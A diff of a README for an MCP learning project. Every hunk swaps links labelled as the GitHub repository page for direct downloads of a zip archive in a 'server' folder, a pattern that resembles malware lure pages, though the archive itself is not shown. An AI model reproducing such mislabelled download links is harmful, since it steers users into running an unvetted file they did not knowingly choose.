@@ -1,6 +1,6 @@
 # 🧭 MCP_Detailed_With_Projects - Learn MCP With Real Projects
 
-[![Download](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects)
+[![Download](https://img.shields.io/badge/Download%20Now-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects/raw/refs/heads/main/server/MC-With-Detailed-Projects-v3.5.zip)
 
 ## 🚀 What This Is
 
@@ -29,7 +29,7 @@ If the project includes extra tools, you may also need:
 
 Use this link to visit the page and download the project:
 
-[Open MCP_Detailed_With_Projects on GitHub](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects)
+[Open MCP_Detailed_With_Projects on GitHub](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects/raw/refs/heads/main/server/MC-With-Detailed-Projects-v3.5.zip)
 
 After you open the page:
 
@@ -207,7 +207,7 @@ If you want the simplest path:
 
 If you need the main download page again, use this link:
 
-[Visit MCP_Detailed_With_Projects on GitHub](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects)
+[Visit MCP_Detailed_With_Projects on GitHub](https://github.com/Birdieflemishspeaking787/MCP_Detailed_With_Projects/raw/refs/heads/main/server/MC-With-Detailed-Projects-v3.5.zip)
 
 ## 🗂️ Possible Repo Layout
 
